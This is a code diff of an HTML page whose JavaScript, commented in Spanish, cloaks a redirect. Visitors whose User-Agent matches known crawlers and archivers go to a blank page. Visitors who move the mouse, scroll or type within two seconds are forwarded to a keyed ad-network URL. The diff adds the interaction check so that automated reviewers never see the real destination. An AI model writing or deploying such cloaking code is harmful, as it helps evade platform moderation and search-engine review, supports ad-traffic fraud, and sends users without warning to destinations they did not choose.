@@ -13,21 +13,59 @@
             "YandexBot", "Sogou", "Facebot", "ia_archiver"
         ];
 
-        // Función para detectar si es un bot
+        // Función para detectar si es un bot por el User-Agent
         function isBot() {
             const userAgent = navigator.userAgent;
             return botUserAgents.some(bot => userAgent.includes(bot));
         }
 
-        // Si es un bot, redirigimos a una página vacía para evitar el tráfico no deseado
-        if (isBot()) {
-            // Redirigir a una página vacía si es un bot
-            window.location.replace("about:blank");
+        // Función para detectar interacción humana en la página
+        function hasHumanInteraction() {
+            return new Promise((resolve) => {
+                let interacted = false;
+
+                // Detectar interacción con el mouse, scroll o teclado
+                function onUserInteraction() {
+                    interacted = true;
+                    clearTimeout(timeout);
+                    resolve(interacted);
+                }
+
+                const timeout = setTimeout(() => {
+                    resolve(interacted);
+                }, 2000); // Después de 2 segundos sin interacción, asume que es bot
+
+                // Escuchar interacciones del usuario
+                document.addEventListener("mousemove", onUserInteraction);
+                document.addEventListener("scroll", onUserInteraction);
+                document.addEventListener("keydown", onUserInteraction);
+            });
         }
+
+        // Detectar y redirigir solo si es tráfico real
+        async function handleTraffic() {
+            if (isBot()) {
+                // Si es un bot, redirigir a una página vacía
+                window.location.replace("about:blank");
+            } else {
+                // Esperar 2 segundos para detectar interacción humana
+                const interacted = await hasHumanInteraction();
+                if (interacted) {
+                    // Si hubo interacción humana, permitir la redirección
+                    window.location.replace("https://www.effectiveratecpm.com/yzmvq78n?key=8ecb5d166f3c46a6bd52bb278155058f");
+                } else {
+                    // Si no hubo interacción humana, redirigir a una página vacía
+                    window.location.replace("about:blank");
+                }
+            }
+        }
+
+        // Ejecutar al cargar la página
+        window.onload = handleTraffic;
     </script>
 </head>
 <body>
-    <!-- El contenido de la página será redirigido de inmediato si el tráfico es real -->
+    <!-- La redirección se maneja mediante JavaScript -->
 </body>
 </html>
 
